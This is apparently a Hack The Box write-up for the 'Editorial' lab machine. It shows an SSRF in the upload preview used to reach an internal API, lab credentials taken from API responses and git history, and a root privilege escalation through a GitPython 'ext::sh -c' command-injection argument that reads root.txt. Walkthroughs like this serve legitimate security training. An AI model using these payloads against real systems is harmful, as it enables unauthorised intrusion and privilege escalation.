---
title: "Editorial"
date: 2025-03-16
categories: HTB
tags: ["editorial", "ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

# Editorial

# Editorial

## Summary
# Credentials
| Username | Password                 | Hash | Source |
| -------- | ------------------------ | ---- | ------ |
| dev      | dev080217_devAPI!@       |      |        |
| prod     | 080217_Producti0n_2023!@ |      |        |
|          |                          |      |        |
# Todo
- [ ] 
# Enumeration
-  nginx/1.18.0 (Ubuntu)
# Initial Access
- `Preview` button on the `/upload` form is vulnerable to SSRF. 
- Add `http://127.0.0.1/FUZZ` as `bookurl` on the request.
- Fuzz ports using ffuf returns port 5000. 
```sh
ffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61
```
- Navigation to the URL in the response downloads a file. 
	- contains api information
	- one of them contains credentials
- SSH as dev.
# Privilege Escalation
- `/.git` log contains credentials for `prod`.
- `sudo -l` as prod shows a python script that can be run. 
- `pip3 list` shows installed python packages and versions.
- GitPython 3.1.2.9 has a RCE vulnerability. 
 

# Enumeration
## Nmap
# TCP
```sh
Nmap scan report for 10.10.11.20
Host is up, received user-set (0.019s latency).
Scanned at 2024-10-06 11:47:55 AEDT for 31s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/6%OT=22%CT=1%CU=43798%PV=Y%DS=2%DC=T%G=Y%TM=6701
OS:DE5A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)
```

## 80-HTTP
# Directory Fuzzing
## Gobuster
```sh
ffuf -c -r -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://FUZZ.editorial.htb/"

gobuster dir -u http://editorial.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x txt,zip,php -k

ffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61

```

![screenshot](/assets/images/editorial3.png)

![screenshot](/assets/images/editorial4.png)
# Screenshots
![screenshot](/assets/images/editorial1.png)

http://editorial.htb/upload
![screenshot](/assets/images/editorial2.png)

`Preview` button is vulnerable to SSRF.
![screenshot](/assets/images/editorial5.png)

Add `http://127.0.0.1` under bookurl.
Still vulnerable.
![screenshot](/assets/images/editorial6.png)
Save the header as as `req.txt`

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 302
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi7yH97Mb8QNIw8t3
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

## Port Fuzzing

- Right click -> Copy to file -> req.txt
![screenshot](/assets/images/editorial9.png)

```sh
ffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61
```

![screenshot](/assets/images/editorial10.png)
![screenshot](/assets/images/editorial11.png)

![screenshot](/assets/images/editorial12.png)

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

![screenshot](/assets/images/editorial15.png)


![screenshot](/assets/images/editorial14.png)

![screenshot](/assets/images/editorial16.png)

```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```
# Foothold
## Attempts
### SSH 
| dev | dev080217_devAPI!@ |
| --- | ------------------ |
![screenshot](/assets/images/editorial17.png)

# Privilege Escalation
## Enumeration

![screenshot](/assets/images/editorial18.png)
![screenshot](/assets/images/editorial22.png)

```sh
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500     commit: change(api): downgrading prod to dev
```

![screenshot](/assets/images/editorial23.png)

```text
'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```

| prod | 080217_Producti0n_2023!@ |
| ---- | ------------------------ |
## LSE
![screenshot](/assets/images/editorial19.png)

## SUID3NUM
![screenshot](/assets/images/editorial20.png)

## Notes


## Attempts
![screenshot](/assets/images/editorial24.png)

![screenshot](/assets/images/editorial25.png)

### clone_prod_change.py
![screenshot](/assets/images/editorial26.png)

![screenshot](/assets/images/editorial27.png)

https://github.com/gitpython-developers/GitPython/issues/1515
![screenshot](/assets/images/editorial28.png)

```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```

![screenshot](/assets/images/editorial29.png)
